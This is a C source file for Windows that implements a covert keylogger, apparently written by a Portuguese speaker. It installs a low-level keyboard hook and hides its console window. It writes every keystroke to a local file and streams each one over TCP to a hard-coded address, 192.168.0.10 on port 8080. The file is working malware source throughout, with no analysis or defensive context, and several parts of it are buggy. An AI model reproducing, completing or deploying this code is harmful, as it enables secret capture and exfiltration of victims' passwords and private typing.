#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string.h>
#include <locale.h>

FILE *file;

SOCKET ConnectSocket;
char p;
struct sockaddr_in clientService;
int iResult;
int x;
    char texto[256];



LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam){


BOOL fEatKeystroke = FALSE;


if(nCode==HC_ACTION){




switch(wParam){
case WM_KEYDOWN:
case WM_SYSKEYDOWN:


    {

        PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT) lParam;
    file = fopen("arquivo.txt", "a+");


    switch(p->vkCode){

     case VK_SPACE:
         iResult = send(ConnectSocket, " ", strlen(" "), 0 );
                    fputc(' ', file);
                    fclose(file);
                    break;
                    case VK_SHIFT:
                    case VK_LSHIFT:
                    case VK_RSHIFT:
                    iResult = send(ConnectSocket, "[SHIFT]", strlen("[SHIFT]"), 0 );
                    fputs("\r[SHIFT]\r", file);
                    fclose(file);
                    break;
                    case VK_RETURN:
                    iResult = send(ConnectSocket, "[ENTER]", strlen("[ENTER]"), 0 );
                    fputs("\r[ENTER]\r",file);
                    fclose(file);
                    break;
                    case VK_BACK:
                    iResult = send(ConnectSocket, "[BACKSPACE]", strlen("[BACKSPACE]"), 0 );
                    fputs("\r[BACKSPACE]\r",file);
                    fclose(file);
                    break;
                    case VK_TAB:
                    iResult = send(ConnectSocket, "[TAB]", strlen("[TAB]"), 0 );
                    fputs("\r[TAB]\r",file);
                    fclose(file);
                    break;
                    case VK_RCONTROL:
                    case VK_LCONTROL:
                    printf("%s\n", "Control");
                    iResult = send(ConnectSocket, "[CTRL]", strlen("[CTRL]"), 0 );
                    fputs("\r[CTRL]\r",file);
                    fclose(file);
                    break;
                    case VK_DELETE:
                    iResult = send(ConnectSocket, "[DELETE]", strlen("\r"), 0 );
                    fputs("\r[DEL]\r",file);
                    fclose(file);
                    break;
                    case VK_OEM_1:
                    fputs("\r[ç]\r",file);
                    iResult = send(ConnectSocket, "ç", strlen("ç"), 0 );
                    fclose(file);
                    break;
                    case VK_OEM_2:
                    iResult = send(ConnectSocket, ";", strlen(";"), 0 );
                    fputs("\r[;]\r",file);
                    fclose(file);
                    break;
                    case VK_OEM_3:
                    iResult = send(ConnectSocket, "[?]", strlen("[?]"), 0 );
                    fputs("\r[?]\r",file);
                    fclose(file);
                    break;
                    case VK_OEM_4:
                    iResult = send(ConnectSocket, "´", strlen("´"), 0 );
                    fputs("\r[ [{ ]\r",file);
                    fclose(file);
                    break;
                    case VK_OEM_102:
                    iResult = send(ConnectSocket, "\\", strlen("\\"), 0 );
                    fputs("\r\\r",file);
                    fclose(file);
                    break;
                    case VK_OEM_5:
                    iResult = send(ConnectSocket, "]", strlen("]"), 0 );
                    fputs("\r[\\|]\r",file);
                    fclose(file);
                    break;
                    case VK_OEM_6:
                    iResult = send(ConnectSocket, "[", strlen("["), 0 );
                    fputs("\r[ ]} ]\r",file);
                    fclose(file);
                    break;
                    case VK_UP:
                    iResult = send(ConnectSocket, "↑", strlen("↑"), 0 );
                    fputs("\r↑\r",file);
                    fclose(file);
                    break;
                    case VK_LEFT:
                    iResult = send(ConnectSocket, "←", strlen("←"), 0 );
                    fputs("\r←\r",file);
                    fclose(file);
                    break;
                    case VK_RIGHT:
                    iResult = send(ConnectSocket, "→", strlen("→"), 0 );
                    fputs("\r→\r",file);
                    fclose(file);
                    break;
                    case VK_DOWN:
                    iResult = send(ConnectSocket, "↓", strlen("↓"), 0 );
                    fputs("\r↓\r",file);
                    fclose(file);
                    break;
                    case VK_OEM_7:
                    iResult = send(ConnectSocket, "~", strlen("~"), 0 );
                    fputs("\r['\"]\r",file);
                    fclose(file);
                    break;
                    case VK_OEM_8:
                    iResult = send(ConnectSocket, "|\\", strlen("|\\"), 0 );
                    fputs("\r|\\r",file);
                    fclose(file);
                    break;
                    case VK_LBUTTON:
                    iResult = send(ConnectSocket, "[LEFT-CLICK]", strlen("[left-click]"), 0 );
                    fputs("\r[LEFT-CLICK]r",file);
                    fclose(file);
                    break;
                    case VK_RBUTTON:
                    iResult = send(ConnectSocket, "[RIGHT-CLICK]", strlen("[RIGHT-CLICK]"), 0 );
                    fputs("\r[RIGHT-CLICK]r",file);
                    fclose(file);
                    break;
                    case 187:
                    iResult = send(ConnectSocket, "=", strlen("="), 0 );
                    fputc('+',file);
                    fclose(file);
                    break;
                    case 188:
                    iResult = send(ConnectSocket, ",", strlen(","), 0 );
                    fputc(',',file);
                    fclose(file);
                    break;

                    case 189:
                    iResult = send(ConnectSocket, "-", strlen("-"), 0 );
                    fputc('-',file);
                    fclose(file);
                    break;
                    case 190:
                    fputc('.',file);
                    iResult = send(ConnectSocket, ".", strlen("."), 0 );
                    fclose(file);
                    break;
                    case VK_LMENU:
                    case VK_RMENU:
                    fputc('[ALT]',file);
                    iResult = send(ConnectSocket, "[ALT]", strlen("[ALT]"), 0 );
                    fclose(file);
                    break;

                    case VK_NUMPAD0:
                    fputc('0',file);
                    iResult = send(ConnectSocket, "0", strlen("0"), 0 );
                    fclose(file);
                    break;
                    case VK_NUMPAD1:
                    fputc('1',file);
                    iResult = send(ConnectSocket, "1", strlen("1"), 0 );
                    fclose(file);
                    break;
                    case VK_NUMPAD2:
                    fputc('2',file);
                    iResult = send(ConnectSocket, "2", strlen("2"), 0 );
                    fclose(file);
                    break;
                    case VK_NUMPAD3:
                    fputc('3',file);
                    iResult = send(ConnectSocket, "3", strlen("3"), 0 );
                    fclose(file);
                    break;
                    case VK_NUMPAD4:
                    fputc('4',file);
                    iResult = send(ConnectSocket, "4", strlen("4"), 0 );
                    fclose(file);
                    break;
                    case VK_NUMPAD5:
                    fputc('5',file);
                    iResult = send(ConnectSocket, "5", strlen("5"), 0 );
                    fclose(file);
                    break;
                    case VK_NUMPAD6:
                    fputc('6',file);
                    iResult = send(ConnectSocket, "6", strlen("6"), 0 );
                    fclose(file);
                    break;
                    case VK_NUMPAD7:
                    fputc('7',file);
                    iResult = send(ConnectSocket, "7", strlen("7"), 0 );
                    fclose(file);
                    break;
                    case VK_NUMPAD8:
                    fputc('8',file);
                    iResult = send(ConnectSocket, "8", strlen("8"), 0 );

                    fclose(file);
                    break;
                    case VK_NUMPAD9:
                    iResult = send(ConnectSocket, "9", strlen("8"), 0 );
                    fputc('9',file);
                    fclose(file);
                    break;
                    case VK_CAPITAL:
                    iResult = send(ConnectSocket, "[CAPS LOCK]", strlen("[CAPS LOCK]"), 0 );
                    fputs("\r[CAPS LOCK]\r",file);
                    fclose(file);
                    break;

                    default:

                        x = p->vkCode-65;

                    iResult = send(ConnectSocket, p, strlen(p), 0 );
                    fputc(p->vkCode, file);
                   fclose(file);
                   break;

    }

        break;
    }
}



}
return (

        fEatKeystroke? 1:CallNextHookEx(NULL, nCode, wParam, lParam));

}



void MessageLoop(){

MSG message;
while (GetMessage(&message, NULL, 0,0)){

    TranslateMessage(&message);
    DispatchMessage(&message);

}


}


DWORD  WINAPI TheKeyLogger(){




HINSTANCE hinstExe = GetModuleHandle(NULL);


    HHOOK hhLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hinstExe, 0);

MessageLoop();
UnhookWindowsHookEx(hhLowLevelKybd);


}

int main(int arc, char *argv[]){
    setlocale(LC_ALL, "Portuguese_Brasil");
 HWND hidden;
    AllocConsole();
    hidden = FindWindow("ConsoleWindowClass", NULL);
    ShowWindow(hidden, 0);


WSADATA wsaData;

    iResult = WSAStartup(MAKEWORD(2,2), &wsaData);

    if (iResult != NO_ERROR) {
        wprintf(L"Parece que ocorreu algum erro%d\n", iResult);
        return 1;
    }

    ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    clientService.sin_family = AF_INET;
    clientService.sin_addr.s_addr = inet_addr("192.168.0.10");
    clientService.sin_port = htons(8080);

    iResult = connect(ConnectSocket, (SOCKADDR *) & clientService, sizeof (clientService));

/*


    HWND hwnd_win = GetForegroundWindow();
    ShowWindow(hwnd_win,SW_HIDE);
*/
    HANDLE hThread;
    DWORD dwThread;


    hThread  = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)TheKeyLogger, (LPVOID)argv[0], NULL, &dwThread);
    if(hThread){
        return WaitForSingleObject(hThread, INFINITE);
    }else {

        return 1;

    }










return 0;
}
